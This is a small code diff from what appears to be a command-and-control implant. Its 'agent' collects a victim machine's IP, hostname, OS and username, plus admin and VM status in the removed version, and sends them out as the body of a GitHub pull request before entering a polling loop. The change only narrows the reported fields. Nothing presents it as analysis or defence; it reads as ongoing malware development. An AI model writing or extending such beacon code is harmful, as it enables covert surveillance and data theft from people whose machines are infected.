@@ -32,7 +32,7 @@ def start():
 
     title = f"Agent#{ID}"
     now = datetime.now()
-    body = f"{MSG} Time: {now.strftime('%d/%m/%Y %H:%M:%S')}\nIP: {sn0wflake.getIP()}\nBits: {sn0wflake.getBits()}\nHostname: {sn0wflake.getHostname()}\nOS: {sn0wflake.getOS()}\nUsername: {sn0wflake.getUsername()}\nCPU: {sn0wflake.getCPU()}\nAdmin: {sn0wflake.isAdmin()}\nVM: {sn0wflake.isVM()}"
+    body = f"{MSG} Time: {now.strftime('%d/%m/%Y %H:%M:%S')}\nIP: {sn0wflake.getIP()}\nHostname: {sn0wflake.getHostname()}\nOS: {sn0wflake.getOS()}\nUsername: {sn0wflake.getUsername()}"
     pr = repo.create_pull(title=title, body=body, head=head_branch.ref, base=base_branch)
 
     while True:
